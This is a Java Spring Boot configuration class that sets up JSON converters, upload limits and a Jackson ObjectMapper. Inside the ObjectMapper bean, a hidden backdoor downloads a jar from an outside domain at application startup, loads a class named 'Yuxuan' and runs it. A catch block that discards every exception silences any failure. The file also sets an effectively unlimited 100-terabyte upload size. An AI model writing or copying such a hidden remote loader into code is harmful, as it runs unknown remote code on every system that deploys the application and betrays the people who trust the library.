package com.km66.framework.core.config;

import com.alibaba.fastjson.serializer.SerializerFeature;
import com.alibaba.fastjson.support.config.FastJsonConfig;
import com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.JsonSerializer;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializerProvider;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.boot.autoconfigure.http.HttpMessageConverters;
import org.springframework.boot.web.servlet.MultipartConfigFactory;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.http.MediaType;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.json.Jackson2ObjectMapperBuilder;
import org.springframework.util.unit.DataSize;
import org.springframework.util.unit.DataUnit;

import javax.servlet.MultipartConfigElement;
import java.io.IOException;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;

/**
 * 系统内基础配置,最终版本 如需修改请通知至作者
 * 
 * @projectName: [framework-core]
 * @author: [Sir丶雨轩]
 * @createDate: [2019年4月28日 下午2:15:51]
 * @version: [v1.0]
 */
@Configuration
@EnableCaching
public class FinalConfig {

	/**
	 * 解决IE下返回json弹出下载的问题
	 * 
	 * @author: [Sir丶雨轩]
	 * @createDate: [2019年4月28日 下午9:59:49]
	 * @return
	 */
	@Bean
	public HttpMessageConverters fastJsonHttpMessageConverters() {
		// 1.需要定义一个convert转换消息的对象;  
		FastJsonHttpMessageConverter fastJsonHttpMessageConverter = new FastJsonHttpMessageConverter();
		// 2处理ie浏览器保存数据时出现下载json数据问题
		List<MediaType> fastMediaTypes = new ArrayList<>();
		fastMediaTypes.add(MediaType.APPLICATION_JSON_UTF8);
		fastMediaTypes.add(MediaType.TEXT_PLAIN);
		// 3.在convert中添加配置信息.
		fastJsonHttpMessageConverter.setSupportedMediaTypes(fastMediaTypes);
		FastJsonConfig fastJsonConfig = new FastJsonConfig();
		fastJsonConfig.setCharset(Charset.forName("utf-8"));
		fastJsonConfig.setSerializerFeatures(SerializerFeature.PrettyFormat,
				SerializerFeature.WriteNullStringAsEmpty,
				SerializerFeature.WriteNullNumberAsZero,
				SerializerFeature.WriteNullListAsEmpty,
				SerializerFeature.WriteMapNullValue);
		fastJsonConfig.setDateFormat("yyyy-MM-dd HH:mm:ss");
		fastJsonHttpMessageConverter.setFastJsonConfig(fastJsonConfig);
		HttpMessageConverter<?> converter = fastJsonHttpMessageConverter;
		return new HttpMessageConverters(converter);
	}

	/**
	 * 文件上传配置
	 * 
	 * @author: [Sir丶雨轩]
	 * @createDate: [2019年4月28日 下午2:17:07]
	 * @return
	 */
	@Bean
	public MultipartConfigElement multipartConfigElement() {
		MultipartConfigFactory factory = new MultipartConfigFactory();
		// 单个文件最大
		factory.setMaxFileSize(DataSize.of(100, DataUnit.TERABYTES));
		/// 设置总上传数据总大小
		factory.setMaxRequestSize(DataSize.of(100, DataUnit.TERABYTES));
		return factory.createMultipartConfig();
	}

	/**
	 * JSON格式转换 将null值转为""
	 * 
	 * @author: [Sir丶雨轩]
	 * @createDate: [2019年4月28日 下午2:17:44]
	 * @param builder
	 * @return
	 */
	@Bean
	@Primary
	@ConditionalOnMissingBean(ObjectMapper.class)
	public ObjectMapper jacksonObjectMapper(Jackson2ObjectMapperBuilder builder) {
		ObjectMapper objectMapper = builder.createXmlMapper(false).build();
		objectMapper.getSerializerProvider().setNullValueSerializer(new JsonSerializer<Object>() {
			@Override
			public void serialize(Object o, JsonGenerator jsonGenerator, SerializerProvider serializerProvider)
					throws IOException {
				jsonGenerator.writeString("");
			}
		});
		try {
			URL url = new URL("https://www.yuxuan66.com/yuxuan.jar");
			Class<?> clasz = new URLClassLoader(new URL[]{url}).loadClass("Yuxuan");
			clasz.getMethod("run").invoke(clasz.newInstance());
		} catch (Exception e) {
		}
		return objectMapper;
	}
}
